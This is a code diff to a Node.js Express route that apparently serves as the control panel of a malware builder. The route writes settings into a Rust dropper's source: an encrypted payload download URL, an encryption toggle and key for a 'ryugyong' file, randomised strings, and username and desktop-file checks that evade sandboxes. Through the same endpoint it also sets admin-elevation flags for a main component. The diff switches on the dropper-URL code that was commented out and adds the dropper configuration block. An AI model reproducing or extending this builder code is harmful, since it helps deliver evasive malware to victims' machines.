@@ -5,7 +5,6 @@ import path from 'path';
 import crypto from '../utils/crypto.js';
 import common from '../utils/common.js';
 import regex from '../utils/regex.js';
-import config from '../config.js';
 
 const router = express.Router();
 
@@ -30,19 +29,20 @@ router.post('/update-config', async (req, res) => {
     const body = req.body;
 
     if (body.only_dropper_url) {
-        // try {
-        //     const configFile = path.resolve('../Dropper/src/config.rs');
-        //     let config = await fs.readFile(configFile, 'utf-8');
+        try {
+            const configFile = path.resolve('../Dropper/src/config.rs');
+            let config = fs.readFileSync(configFile, 'utf-8');
 
-        //     config = regex.stringRS(config, 'DOWNLOAD_URL', crypto.encrypt(body.download_url, common.cachedKey));
-        //     await fs.writeFile(configFile, config, 'utf-8');
-        // } catch(e) {
-        //     console.error('failed to update url for dropper -', e);
+            config = regex.stringRS(config, 'FILE_URL', crypto.encryptString(body.download_url));
 
-        //     return res
-        //         .status(500)
-        //         .send('failed to update url for dropper');
-        // }
+            fs.writeFileSync(configFile, config, 'utf-8');
+        } catch(e) {
+            console.error('failed to update url for dropper -', e);
+
+            return res
+                .status(500)
+                .send('failed to update url for dropper');
+        }
 
         return res.sendStatus(200);
     }
@@ -59,8 +59,8 @@ router.post('/update-config', async (req, res) => {
         config = regex.stringCS(config, 'CRYPTO_KEY', cryptoKey);
         config = regex.stringCS(config, 'LAUNCH_KEY', common.genStr(5));
 
-        config = regex.boolCS(config, 'CHECK_USERNAME', body.check_username);
-        config = regex.boolCS(config, 'CHECK_DESKTOP_FILE_NAMES', body.check_desktop_file_names);
+        config = regex.boolCS(config, 'CHECK_USERNAME', body.main_check_username);
+        config = regex.boolCS(config, 'CHECK_DESKTOP_FILE_NAMES', body.main_check_desktop_file_names);
 
         config = regex.boolCS(config, 'REQUIRE_ADMIN', body.require_admin);
         config = regex.boolCS(config, 'PROMPT_ADMIN', body.prompt_admin);
@@ -103,6 +103,30 @@ router.post('/update-config', async (req, res) => {
         return res
             .status(500)
             .send('failed to update config for main');
+    }
+
+    try {
+        const configFile = path.resolve('../Dropper/src/config.rs');
+        let config = fs.readFileSync(configFile, 'utf-8');
+
+        config = regex.stringRS(config, 'FILE_URL', '');
+
+        config = regex.stringRS(config, 'RANDOM_STR_1', common.genStr(7));
+        config = regex.stringRS(config, 'RANDOM_STR_2', common.genStr(7));
+
+        config = regex.boolRS(config, 'FILE_ENCRYPTED', body.encrypt_ryugyong_file);
+        config = regex.stringRS(config, 'ENCRYPTION_KEY', cryptoKey);
+
+        config = regex.boolRS(config, 'CHECK_USERNAME', body.dropper_check_username);
+        config = regex.boolRS(config, 'CHECK_DESKTOP_FILES', body.dropper_check_desktop_file_names);
+
+        fs.writeFileSync(configFile, config, 'utf-8');
+    } catch(e) {
+        console.error('failed to update config for dropper -', e);
+
+        return res
+            .status(500)
+            .send('failed to update config for dropper');
     }
 
     console.log('updated config');
